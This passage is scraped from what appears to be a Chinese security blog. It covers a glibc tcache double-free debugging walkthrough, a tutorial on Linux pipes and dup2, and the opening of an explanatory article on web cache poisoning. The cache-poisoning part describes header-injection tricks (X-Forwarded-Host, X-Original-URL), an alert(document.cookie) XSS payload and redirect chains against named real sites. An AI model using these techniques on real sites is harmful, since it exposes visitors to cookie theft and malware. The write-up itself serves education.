-<h2 id="第二次free后"><a href="#第二次free后" class="headerlink" title="第二次free后"></a>第二次free后</h2><p><img src="/image/doubleFree/aftersecondfree-code.jpg" alt="aftersecondfree-code"></p>
-<p>此时tcache如下所示：</p>
-<p><img src="/image/doubleFree/aftersecondfree-tcache.jpg" alt="aftersecondfree-tcache"></p>
-<p>此时地址0x55555575ecd0-0x10如下所示：</p>
-<p><img src="/image/doubleFree/aftersecondfree-mnb.jpg" alt="aftersecondfree-mnb"></p>
-<p>可以看到，tcache显示loop detected，并且被double free的0x55555575ecd0这一堆块的fd指针指向了0x000055555575edd0，即tcache中显示的下一个空闲堆块</p>
-<p>而0x000055555575edd0所指向的堆块如下所示：</p>
-<p><img src="/image/doubleFree/aftersecondfree-another.jpg" alt="aftersecondfree-another"></p>
-<p>可以看到此时0x000055555575edd0所指向的堆块中fd为0x55555575ecd0，那么这也就可以解释loop出现的原因，0x55555575ecd0与0x000055555575edd0中的fd互相指向，形成了一个循环，这是不应当的</p>
-<h2 id="跳至“第一块”0x55555575ecd0被分配"><a href="#跳至“第一块”0x55555575ecd0被分配" class="headerlink" title="跳至“第一块”0x55555575ecd0被分配"></a>跳至“第一块”0x55555575ecd0被分配</h2><p>此时double free的问题还没有显现出来</p>
-<p><img src="/image/doubleFree/first-ecd-code.jpg" alt="first-ecd-code"></p>
-<p>此时tcache如下所示：</p>
-<p><img src="/image/doubleFree/firstalloc-ecd-tcache.jpg" alt="firstalloc-ecd-tcache"></p>
-<p>0x000055555575edd0和0x55555575ecd0堆块如下所示：</p>
-<p><img src="/image/doubleFree/firstalloc-ecd-twoheap.jpg" alt="firstalloc-ecd-twoheap"></p>
-<p>可以看到，断点下到了即将执行malloc的代码处，申请的堆空间为4字节，加上头长为0x14，故而分配0x20size的堆块，此时tcache显示下一个即将被分配的0x20size的堆块为被我们double free的”第一块”0x55555575ecd0</p>
-<h2 id="准备填入数据"><a href="#准备填入数据" class="headerlink" title="准备填入数据"></a>准备填入数据</h2><p>当“第一块”0x55555575ecd0被分配给data_len后，我准备向这个堆块中填入数据</p>
-<p><img src="/image/doubleFree/rec-data-first-ecd-code.jpg" alt="rec-data-first-ecd-code"></p>
-<p> 此时0x000055555575edd0和0x55555575ecd0堆块如下所示：</p>
-<p><img src="/image/doubleFree/rec-data-first-twoheap.jpg" alt="rec-data-first-twoheap"></p>
-<p>tcache如下所示：</p>
-<p><img src="/image/doubleFree/rec-data-first-tcache.jpg" alt="rec-data-first-tcache"></p>
-<p>可以看到，我准备向0x55555575ecd0指向的堆块中写入四个字节的数据，而且此时0x000055555575edd0和0x55555575ecd0堆块以及tcache并没有变动</p>
-<h2 id="填入数据"><a href="#填入数据" class="headerlink" title="填入数据"></a>填入数据</h2><p><img src="/image/doubleFree/rec-data-first-done-code.jpg" alt="rec-data-first-done-code"></p>
-<p>此时tcache：</p>
-<p><img src="/image/doubleFree/rec-data-first-done-tcache.jpg" alt="rec-data-first-done-tcache"></p>
-<p>此时0x000055555575edd0和0x55555575ecd0堆块：</p>
-<p><img src="/image/doubleFree/rec-data-first-done-twoheap.jpg" alt="rec-data-first-done-twoheap"></p>
-<p>可以看到，我向0x55555575ecd0指向的堆块中的低四字节写入了0x00000001,而此时由于0x55555575ecd0被tcache误认为仍是空闲堆块(还存在在tcache的链上)，故而在tcache看来，0x55555575ecd0所指向的堆块的头八个字节应当是fd，即指向下一个空闲堆块，故而误将我写入后的四字节+原本的四字节当作了下一个空闲堆块的地址，即0x0000555510000000，而这个地址是无法访问的，从tcache也可以看出，其误将0x0000555510000000作为了“第二个”0x55555575ecd0后的空闲堆块，由于无法访问这一个地址，故而显示<code>[Corrupted chunk at 0x555510000000]</code></p>
-<p>实际上我这里还有一个错误，就是在data_len使用完后并没有立即释放，故而0x55555575ecd0所指向的堆块在之后的程序中会一直呈现被占用的状态，不会再有指针去修改其中的数据，这也代表着Corrupted chunk像一个定时炸弹一样，等待其被分配的那一刻</p>
-<p>不过就算我立即free了data_len，随后仍有可能会有其他的指针获得0x55555575ecd0指向的堆块并修改其中的数据，将0x0000555510000000改为其他的值，继续维持异常的状态，导致同样的崩溃</p>
-<h2 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h2><p>跳至等到所有排在Corrupted chunk之前的堆块都被分配后</p>
-<p><img src="/image/doubleFree/boooom-code.jpg" alt="boooom-code"></p>
-<p>此时tcache：</p>
-<p><img src="/image/doubleFree/boooom-tcache.jpg" alt="boooom-tcache"></p>
-<p>此时0x000055555575edd0和0x55555575ecd0堆块：</p>
-<p><img src="/image/doubleFree/boooom-twoheap.jpg" alt="boooom-twoheap"></p>
-<p>可以看见即将要执行malloc(4)的操作，对应0x20size的堆块，而在tcache中显示下一块即将被分配的0x20size的堆块为<code>Corrupted chunk</code>，故而在此句程序结束后，程序崩溃，并抛出了错误<code>Program received signal SIGSEGV, Segmentation fault.</code></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>实际上，这样的漏洞进一步可以导致<code>write-anything-anywhere</code>问题，而且当写入的内容可以由外部决定时(例如从socket上获取数据)尤为严重，配合其他的漏洞就有可能形成攻击链。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/10/23/Double-free/" data-id="ckhx996620003ar5yhvj97ksf" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/binary/" rel="tag">binary</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-linux-fd" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/09/05/linux-fd/" class="article-date">
-  <time datetime="2020-09-05T08:12:33.000Z" itemprop="datePublished">2020-09-05</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/%E7%BC%96%E7%A8%8B/">编程</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/05/linux-fd/">linux中的pipe与fd</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="Pipe"><a href="#Pipe" class="headerlink" title="Pipe"></a>Pipe</h1><p>我们经常能看到如下的代码：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">int pipefd[2];</span><br><span class="line">int status &#x3D; pipe(pipefd);</span><br><span class="line">if(status&#x3D;&#x3D;-1)&#123;</span><br><span class="line">  printf(&quot;create pipe erro\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">...fork()....</span><br><span class="line">&#x2F;&#x2F;child</span><br><span class="line">dup2(pipefd[0], STDIN_FILENO);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-<p>(这边省略了父子进程close无用fd的代码，要close这些无用fd，参看下面的讲解)</p>
-<p>上面这段代码首先定义了一对pipe的fd，初始化这对pipe，并在fork后的子进程中将子进程的标准输入重定向至pipefd[1]</p>
-<p>在理解上面的含义之前，其实我应当声明一些重要的概念，首先是在声明初始化一对pipe时，默认pipefd[1]是数据流入端，而pipefd[0]是数据流出端，并且，pipe是单向的，永远从pipefd[1] –&gt; pipefd[0]</p>
-<p>另外，以下这部分代码经常引起疑惑(大概)：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dup2(pipefd[0], STDIN_FILENO);</span><br></pre></td></tr></table></figure>
-
-<p>因为上面说过，pipefd[0]是数据流出端，那为啥<strong>标准输入</strong>会与pipefd[0]打上交道呢？一个<strong>输入</strong>，一个<strong>流出</strong>，感觉貌似弄反了。</p>
-<p>但实际上，并不是如此，因为如果你细细看过dup2的实现你会发现，dup2函数的原型是int dup2(int fd,int fd2)，其实现的功能就是：对于fd2，可以用fd参数指定fd2的值。如果fd2已经打开，则先将其关闭。如若fd等于fd2，则dup2返回fd2，而不关闭它。否则，fd2的FD_CLOEXEC文件描述符标志就被清楚，这样fd2在进程调用exec时是打开状态。</p>
-<p>那这里面实际上最重要的，就是这个<strong>关闭</strong>是啥意思</p>
-<p>实际上，我们可以把fd看成一个连线图的感觉，举例来说，原先STDIN_FILENO指向的是键盘，也就是我们所谓的标准输出，但是，如果经过上面的代码，那么STDIN_FILENO将会取消指向键盘，转而指向pipefd[0]所指向的管道的0端，所以此时只要是管道的0端<strong>流出的任何东西</strong>都将会成为STDIN_FILENO所<strong>接受的输入</strong></p>
-<p>看到这儿，基本能解释“弄反”的疑惑了，反之同理，如下的代码将表示STDOUT_FILENO以及STDERR_FILENO所<strong>输出的任何东西</strong>将变为管道的1端(pipefd[1]指向的就是管道的1端)所<strong>流入的任何东西</strong></p>
-<p>(管道的0端和1端可以看下面的抽象图形)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dup2(pipefd[1],STDOUT_FILENO);</span><br><span class="line">dup2(pipefd[1],STDERR_FILENO);</span><br></pre></td></tr></table></figure>
-
-<p>那管道呢，实际上我们可以将其抽象为这样一个图形：</p>
-<p>pipe :           pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–pipefd[0]</p>
-<p>而所谓的dup2(pipefd[0], STDIN_FILENO)，也就是这样：</p>
-<p>更改后：        pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–(pipefd[0],STDIN_FILENO)  </p>
-<p>(注意:这里写在一起只是因为不方便画图，实际上pipefd[0]，STDIN_FILENO是<strong>分别</strong>指向管道的0端，并不是STDIN_FILENO先指向pipefd[0]，pipefd[0]再指向管道的0端，这很关键！是分叉而不是直线!)</p>
-<p>而一般我们在子进程中调用完<code>dup2(pipefd[0], STDIN_FILENO);</code>后会调用<code>close(pipefd[0])</code>，让pipefd[0]不再指向0，从而将管道变为这样：</p>
-<p>pipe :           pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–STDIN_FILENO</p>
-<p>这时，父进程只需要向pipefd[1]中写入数据，就会通过管道，写入至子进程的STDIN_FILENO中了</p>
-<p>但是这里要注意了，务必要在调用完<code>dup2(pipefd[0], STDIN_FILENO);</code>之后再调用<code>close(pipefd[0])</code>，切不可倒过来，因为一旦倒过来，先取消了pipefd[0]与管道0端的绑定，那么STDIN_FILENO将无法与管道0端进行绑定!(其实就有点pipefd[0]把自己的绑定信息“拷贝”给STDIN_FILENO的感觉，如果自己绑定信息被清空，那么自然也就无法“拷贝”给STDIN_FILENO了，意思是这么个意思，不想深究其原理的话大致可以粗浅的这么认为)</p>
-<p>另外还有一点需要提一下，那就是如果在fork之前执行了dup2函数，那么fork后的子进程依然会继承父进程dup2函数所带来的影响，换句话说，就是继承相同的fd表。那么如果上面的dup2语句放在了fork前执行，那么管道会变成这样：</p>
-<p>pipe :           pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–(父-STDIN_FILENO,子-STDIN_FILENO）</p>
-<p>那么此时可以发现，有两个标准输入都指向了同一条管道的0端，那么为了防止由1端输入的数据被错误进程的标准输入读走，我们必须在读出数据前取消其中一个STDIN_FILENO与此管道的绑定</p>
-<p>如果说我们希望子进程来读，那么在fork之后，父进程必须记得执行close(0),取消自己的标准输入与管道的绑定，让管道变成如下这样：</p>
-<p>pipe :           pipefd[1]–指向–&gt;1———数据流转———&gt;0&lt;–指向–子-STDIN_FILENO</p>
-<p>这样的话，父进程向pipefd[1]中写入数据，就能保证一定会被子进程的标准输入所捕获了，所以由此可得，我们在使用一条管道时，<strong>务必保证指向管道1端以及指向管道0端的fd分别有且仅有一个</strong>，不然程序可能会出现预期之外的行为</p>
-<p>最后，因为管道是单向的，所以如果我们还希望将子进程的输出由父进程捕获，那么我们就还需要另一条管道，用来使子进程向父进程传输数据</p>
-<p>如下：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">int pipefd[2];</span><br><span class="line">int pipefd2[2];</span><br><span class="line">int status &#x3D; pipe(pipefd);</span><br><span class="line">if(status&#x3D;&#x3D;-1)&#123;</span><br><span class="line">  printf(&quot;create pipe erro\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">int status2 &#x3D; pipe(pipefd2);</span><br><span class="line">if(status2&#x3D;&#x3D;-1)&#123;</span><br><span class="line">  printf(&quot;create pipe erro\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line">......</span><br><span class="line">...fork()....</span><br><span class="line">&#x2F;&#x2F;child</span><br><span class="line">dup2(pipefd[0], STDIN_FILENO);</span><br><span class="line">dup2(pipefd2[1],STDOUT_FILENO);</span><br><span class="line">dup2(pipefd2[1],STDERR_FILENO);</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
-
-<p>(这边省略了父子进程close无用fd的代码，要close这些无用fd，参看上面的讲解，是一个意思)</p>
-<p>这样，子进程的输出将会自动写入pipefd2[1]，父进程只需要根据需要，读出pipefd2[0]的数据即可实现子—-&gt;父的通讯过程</p>
-<p>另外，还有个小tip，就是有时候我们会无限循环地读管道地数据流出端(即0端)，那么我们该如何退出这个死循环，就像go中close channel一样，让读出端能够感知管道已经被废弃，从而结束”读“任务呢？</p>
-<p>要完成以上的目标，我们所需要做的，就是将1端，即数据输入端的引用计数变为0，也即相当于我们上面所提到的，取消所有fd与管道数据输入端的绑定，当输入端的引用计数变为0时，读取者将会读到0，此时通过判断数据长度是否为0就可以退出循环</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>其实管道的内部实现是很复杂的，linux的管道机制要深究起来能写一本书。。。以后有空还是要多研究总结，不然老是记混 👻</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2020/09/05/linux-fd/" data-id="ckhx9966e000qar5y2qki75l4" class="article-share-link">Share</a>
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/code/" rel="tag">code</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-  
-    <article id="post-Web-Cache-Poisoning" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2020/08/25/Web-Cache-Poisoning/" class="article-date">
-  <time datetime="2020-08-25T03:02:20.000Z" itemprop="datePublished">2020-08-25</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/Web%E5%AE%89%E5%85%A8/">Web安全</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/08/25/Web-Cache-Poisoning/">WEB缓存投毒攻击技术</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>老规矩,还是要简单介绍一下这个技术，实际上这个技术和我之前总结的HTTP Smuggling一样，属于比较”冷门”的漏洞，在大家热衷于寻找RCE、XSS、Sql injection的今天，此漏洞看似“垂垂老矣”，其复杂的攻击方式及“理论上的”威胁实在难以得到安全研究人员的青睐</p>
-<p>但是实际上，还是老话，没有无用的，只有你不会的～</p>
-<p>简单说，Web Cache Posioning旨在欺骗网站缓存，尝试劫持缓存服务器，使其缓存错误的资源，从而导致其后一系列如：DOS，XSS等等的攻击</p>
-<p>那我们就来详细聊一聊这个“孤独”的攻击手法吧</p>
-<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>由于Web Cache Posioning这种攻击手段与缓存有着很大的关联，所以首先，需要先熟悉一下缓存的基本原理</p>
-<p>下图可以简单了解缓存的原理:</p>
-<p><img src="/image/Web-Cache-Poisoning/cache.jpg" alt="cache"></p>
-<p>简单来说，就是当一个用户访问了例如/static/test.png这一资源后，Cache服务将会缓存(如果是可缓存的话)这一资源，当之后再有用户访问相同的资源时，Cache服务将不会转发此请求至后端服务器，而是直接将其保存的对应的数据返回。</p>
-<p>听起来是不是很简单？这也是我们经常使用的CDN的最为基本的原理</p>
-<p>但是，作为一个安全人员，在上面这句话中，总也能嗅到一丝危险的味道，“不会转发”、“直接返回”这样的字眼往往蕴含着巨大的风险</p>
-<p>而Web Cache Posioning就是基于这些字眼而发起的攻击，我们的目标就是欺骗前端的缓存服务器，让其误认为受害者与攻击者访问的是同一个资源，从而在不请示后端服务器的情况下，误把被攻击者污染后的资源文件提供给受害者。</p>
-<p><img src="/image/Web-Cache-Poisoning/cache-posioning.jpg" alt="cache-posioning"></p>
-<p>对于缓存服务器，如果其判断是否是<strong>同一个资源</strong>的规则是基于url以及host头时，那么缓存服务器将简单地认为下两个请求是等同的</p>
-<p><img src="/image/Web-Cache-Poisoning/first-request.jpg" alt="first-request"></p>
-<p><img src="/image/Web-Cache-Poisoning/second-request.jpg" alt="second-request"></p>
-<p>可以看到，橙色字体将是缓存服务器判断的根据，所以缓存服务器将会把第一个请求的响应拿来作为第二个请求的响应</p>
-<p>但是我们可以看到，蓝色字体部分，两个请求所请求的文本语言是不一样的，故而这样的话，缓存服务器就“错误”地为第二个用户提供了错误语言版本的响应</p>
-<p>在某种程度上，这就是最简单的(也是不太可能出现的)“欺骗”</p>
-<p>但，事情从此才开始有趣了起来(笑)</p>
-<h1 id="手法"><a href="#手法" class="headerlink" title="手法"></a>手法</h1><p>那么问题来了，我们应当如何有效的“欺骗”缓存服务器呢？</p>
-<p>首先，我之前所讨论的HTTP Smuggling技术，其实就是可以完成这一操作的，如果想不明白，可以回过头看看那篇文章</p>
-<p>当然了，我不会重复讨论同样的手法，所以这里要讲的，是另一种，更为有效，也更为直接的手法，即利用HTTP包头的解释歧义来进行缓存毒化</p>
-<p>详细看看吧</p>
-<h2 id="基础入门"><a href="#基础入门" class="headerlink" title="基础入门"></a>基础入门</h2><p>这里将会举一个redhat.com的真实例子</p>
-<p>在redhat.com的一个页面上，我们发现了一个特殊的标头，如下图所示：</p>
-<p><img src="/image/Web-Cache-Poisoning/redhat-before.jpg" alt="redhat-before"></p>
-<p>可以看见如果我们在请求中带入X-Forwarded-Host标头，那么此标头的值将被用来在meta标签里生成url，那么如果试试xss呢？</p>
-<p><img src="/image/Web-Cache-Poisoning/redhat-after.jpg" alt="redhat-after"></p>
-<p>可以发现，并未做任何过滤，我们的X-Forwarded-Host的值直接被带入了meta标签，造成了XSS</p>
-<p>那么，这个界面是否会被CDN缓存呢？</p>
-<p>这时我们打开无痕浏览，模拟受害者，再次访问这个页面</p>
-<p><img src="/image/Web-Cache-Poisoning/redhat-result.jpg" alt="redhat-result"></p>
-<p>可以看见，我们成功的让CDN缓存了这个界面，所有访问这一页面的用户将会在不知情的情况下遭受XSS攻击</p>
-<h2 id="变得更为谨慎"><a href="#变得更为谨慎" class="headerlink" title="变得更为谨慎"></a>变得更为谨慎</h2><p>上面我们成功的毒化了<a target="_blank" rel="noopener" href="https://www.redhat.com/en?dontpoisoneveryone=1">https://www.redhat.com/en?dontpoisoneveryone=1</a>, 但是，当我们想要毒化类似<a target="_blank" rel="noopener" href="https://www.redhat.com/en">https://www.redhat.com/en</a> 这样的链接时，我们将会遇到很多困难，最主要就是由于这种链接的访问流量将会很大，攻击者很难保证自己的请求能在缓存过期时精确的成为第一个到达的请求，而光靠暴力的方式往往会消耗大量的资源却无法得到预期的结果</p>
-<p>所以，我们需要抓住一切我们可以利用的细节，尝试缩小我们尝试毒化的时间窗口</p>
-<p>就像在unity3d.com中，我们可以发现如下的场景</p>
-<p><img src="/image/Web-Cache-Poisoning/unity3d.jpg" alt="unity3d"></p>
-<p>从图中可以看到，可以使用X-Host标头向网页中注入数据</p>
-<p>另外，可以看见在响应中包含有Age和Cache-Control标头，其中Age标头代表此缓存已经被记录了多少秒，而Cache-control标头表示了过期时间，这里是1800秒</p>
-<p>基于以上的信息，攻击者就可以大大缩小尝试攻击的时间窗口，降低时间成本</p>
-<p>当然了，很多时候大部分网站并没有unity3d这么“友善”，这也是此类攻击技术难以大规模应用的一个原因</p>
-<h2 id="精准投放"><a href="#精准投放" class="headerlink" title="精准投放"></a>精准投放</h2><p>当缓存服务器将UA作为缓存键的一部分时，我们就可以实现对某一类用户的精准毒化</p>
-<p><img src="/image/Web-Cache-Poisoning/vary.jpg" alt="vary"></p>
-<p>从图中可以看到，服务器的响应中包含了vary头，vary头代表了服务器将会以何键作为判断的标准，在这里，UA以及AE头即是判断的标准</p>
-<p>所以，我们便可以对某类UA头进行毒化，实现精准投放</p>
-<h2 id="DOM毒化"><a href="#DOM毒化" class="headerlink" title="DOM毒化"></a>DOM毒化</h2><p>当然了，也不是所有的毒化都像第一个例子一样那么轻松惬意地植入XSS的payload，又或者说，缓存服务器会有一些“额外”的特殊行动</p>
-<p>就比如如下这种</p>
-<p><img src="/image/Web-Cache-Poisoning/dom1.jpg" alt="dom1"></p>
-<p>可以看到我们可以利用X-Forwarded-Host头注入一个自定义的域名</p>
-<p>然后我们发现，此页面调用了data.host用来加载一个外部json</p>
-<p><img src="/image/Web-Cache-Poisoning/dom2.jpg" alt="dom2"></p>
-<p>json包含的内容如下所示</p>
-<p><img src="/image/Web-Cache-Poisoning/dom3.jpg" alt="dom3"></p>
-<p>可以看见json内容包含了网页翻译文本，那也就是说，我们可以控制网页翻译的文本，利用缓存毒化感染使用特定语言的用户</p>
-<p>但我们在json返回的文本中可以看见，由于默认的语言是英语，故而英语不提供翻译文本，也就是说我们无法毒化使用英语的用户</p>
-<p>所以我们需要找一个办法来强制使用英语的用户转变语言至我们控制的语言(这里使用es)</p>
-<p>尝试更换语言至es，观察到浏览器发出了GET /setlang/es请求，响应如下</p>
-<p><img src="/image/Web-Cache-Poisoning/dom4.jpg" alt="dom4"></p>
-<p>可以发现，首先这个302是可以被缓存的，并且跳转后的页面路径是/?localized=1，那么就要考虑如何使得使用英语的用户在访问主页的时候“被迫”更换语言</p>
-<p>通过对GET / 请求的分析，发现了我们可以使用X-Original-URL来重新指定访问的路径</p>
-<p><img src="/image/Web-Cache-Poisoning/dom5.jpg" alt="dom5"></p>
-<p>但是我们可以发现，这个请求无法被缓存，这样就无法将其传递给其他的用户</p>
-<p>通过尝试，发现如果将X-Original-URL: /setlang/es转为X-Original-URL: /setlang\es，服务器将在302请求中将\转为正确的/，并且这样的请求将可以被服务器缓存</p>
-<p><img src="/image/Web-Cache-Poisoning/dom6.jpg" alt="dom6"></p>
-<p>那么现在，利用链已经完整了，首先毒化 <strong>/?localized=1</strong>，使其访问我们所制造的恶意的json文件，并且在 <strong>/?localized=1</strong>被毒化的时间内，毒化 <strong>/</strong> 页面，强制任何访问此页面的用户强制跳转至使用特定语言的 <strong>/?localized=1</strong> 页面，并执行我们所植入的恶意XSS payload。</p>
-<p>成功图如下</p>
-<p><img src="/image/Web-Cache-Poisoning/dom7.jpg" alt="dom7"></p>
-<p>成功地执行了alert(document.cookie) 的payload</p>
-<h2 id="路由中毒"><a href="#路由中毒" class="headerlink" title="路由中毒"></a>路由中毒</h2><p>除了以上的案列，有些服务器还会有不少令人匪夷所思的操作</p>
-<p>比如下面这个，其会被恶意的http头欺骗，并使用此恶意的http标头来请求内部的路由</p>
-<p><img src="/image/Web-Cache-Poisoning/route1.jpg" alt="route1"></p>
-<p>可以看见X-Forwarded-Server标头将会有比Host标头更高的优先级，这欺骗了服务器，让其请求了非预期的资源。但是返回的响应由HTML编码，无法直接XSS</p>
-<p>所以如果要利用这个漏洞，我们需要在HubSpot上托管一个自己的界面，并放入恶意的payload</p>
-<p><img src="/image/Web-Cache-Poisoning/route2.jpg" alt="route2"></p>
-<p>此类问题在SaaS程序上极为常见，因为他们往往会由一个系统来处理去往不同服务的请求</p>
-<h2 id="标头“合作”"><a href="#标头“合作”" class="headerlink" title="标头“合作”"></a>标头“合作”</h2><p>有时候，往往一个欺骗性的标头并不一定能够展现出效果，这时候，就要尝试使用多个标头“合作”欺骗</p>
-<p>来看看下面的实例</p>
-<p><img src="/image/Web-Cache-Poisoning/more1.jpg" alt="more1"></p>
-<p>可以看到X-Forwarded-Host头覆盖了cookie上的domain信息，但是这貌似不会带来任何的脆弱问题，仅仅只是修改了cookie的一个无关紧要的参数并不会带来任何的安全风险</p>
-<p>这时候，试着尝试更多的标头，最终找到了另一个非预期的标头X-Forwarded-Scheme</p>
-<p><img src="/image/Web-Cache-Poisoning/more2.jpg" alt="more2"></p>
-<p>看起来貌似也没啥用，仍然没有任何的威胁</p>
-<p>但是，但我们把两者结合起来，就会发生奇妙的化学反应，产生如下的结果</p>
-<p><img src="/image/Web-Cache-Poisoning/more3.jpg" alt="more3"></p>
-<p>从而我们就获得了劫持任意请求至任意域的能力</p>
-<h2 id="劫持Open-Graph"><a href="#劫持Open-Graph" class="headerlink" title="劫持Open Graph"></a>劫持Open Graph</h2><p>Open Graph是由fb创建的协议，我们在分享一个链接的时候，只要分享的网站支持OG，那么就可以提供更详尽的视图，增强分享的效果</p>
-<p>在下面的这个站点上，我们使用欺骗性的标头将会影响到OG的url</p>
-<p><img src="/image/Web-Cache-Poisoning/og1.jpg" alt="og1"></p>
-<p>可以看到我们影响到了OG的url部分，但是仔细查看响应可以发现，Cache-Control标头的值为private，并且在多次尝试后也证实了服务器拒绝缓存此响应</p>
-<p>但是在其他的页面上，却仍然使用了缓存</p>
-<p><img src="/image/Web-Cache-Poisoning/og2.jpg" alt="og2"></p>
-<p>在这里需要注意，如果按照这样的请求，你会发现这个缓存将无法被有效的缓存，详情可以查看 <a target="_blank" rel="noopener" href="https://blog.cloudflare.com/understanding-our-cache-and-the-web-cache-deception-attack/">CloudFlare缓存机制</a></p>
-<p>所以我们需要使用如下的请求</p>
-<p><img src="/image/Web-Cache-Poisoning/og3.jpg" alt="og3"></p>
-<p> 此时就可以使得此响应被服务器缓存</p>
-<p> 这样就导致了所有在此页面上使用分享功能的用户最终都会分享攻击者所指定的地址</p>
-<p> <video src="/img/Web-Cache-Poisoning/hijack.mp4" width="1000px" height="1000px" controls="controls"></video></p>
-<h2 id="本地路由中毒"><a href="#本地路由中毒" class="headerlink" title="本地路由中毒"></a>本地路由中毒</h2><p>除了X-Forwarded-For等标头以外，实际上还有许多神奇的标头可以实现缓存毒化</p>
-<p>就比如我之前使用到的X-Original-URL，其和X-Rewrite-URL一样，都可以“强制”转变请求路径，且这一路径的转变是缓存服务器所“看不见”的</p>
-<p>就拿Drupal框架来说，以下两个请求将是等价的，但是很明显，服务器对此的响应却是完全不同</p>
-<p><img src="/image/Web-Cache-Poisoning/drupal1.jpg" alt="drupal1"></p>
-<p><img src="/image/Web-Cache-Poisoning/drupal2.jpg" alt="drupal2"></p>
-<p>那么，我们就可以利用这一特性来欺骗应用程序提供完全超出预期的页面，比如下图</p>
-<p><img src="/image/Web-Cache-Poisoning/local-route1.jpg" alt="local-route1"></p>
-<p>如果我们发送这样的请求，那么对于前端缓存服务器来说，其所看到的是/education?x=y，但是实际后端服务器解析的访问路径却是/gambling?x=y</p>
-<p>这样就会使得每一个访问/education?x=y路径的用户意外的得到/gambling?x=y的页面</p>
-<p>当然，除了对于路径的毒化之外，缓存也有可能被毒化查询参数</p>
-<p><img src="/image/Web-Cache-Poisoning/local-route2.jpg" alt="local-route2"></p>
-<p>这样的话，我们将有机会诱导受害者查询非预期的结果</p>
-<p>另外，如果遇到利用重定向来导入js文件的网站，如果存在缓存毒化漏洞，那么攻击者就有可能劫持js文件的加载，强迫受害者加载外部恶意js文件</p>
-<h2 id="Drupal开放式重定向"><a href="#Drupal开放式重定向" class="headerlink" title="Drupal开放式重定向"></a>Drupal开放式重定向</h2><p>首先，Drupal框架存在这样的一个问题，即如下的请求将会导致Drupal框架错误的将用户导向任意一个外部网站</p>
-<p><img src="/image/Web-Cache-Poisoning/drupal-or.jpg" alt="drupal-or"></p>
-<p>那么，配合缓存毒化漏洞，将会有意想不到的结果</p>
-<p>首先我们先发送如下请求，毒化Drupal的内置缓存</p>
-<p><img src="/image/Web-Cache-Poisoning/drupal-posion-internal.jpg" alt="drupal-posion-internal"></p>
-<p>这样，drupal在接到访问/redir路径的请求时，将会直接返回指向外部恶意网站的302重定向响应</p>
-<p>接着我们毒化外部缓存</p>
-<p><img src="/image/Web-Cache-Poisoning/drupal-posion-external.jpg" alt="drupal-posion-external"></p>
-<p>此时，外部任意用户访问/download路径都将会被后端的Drupal缓存认为在访问/redir，从而返回恶意的302响应，并被外部缓存服务器所缓存</p>
-<p>这样，我们就可以基于此向受害者下发恶意软件，导致极大的风险</p>
-<h2 id="一个请求瘫痪网站"><a href="#一个请求瘫痪网站" class="headerlink" title="一个请求瘫痪网站"></a>一个请求瘫痪网站</h2><p>听起来貌似不太可能，但是如果目标网站有着缓存毒化漏洞，那么这是完全可能的</p>
-<p>假想以下一个请求</p>
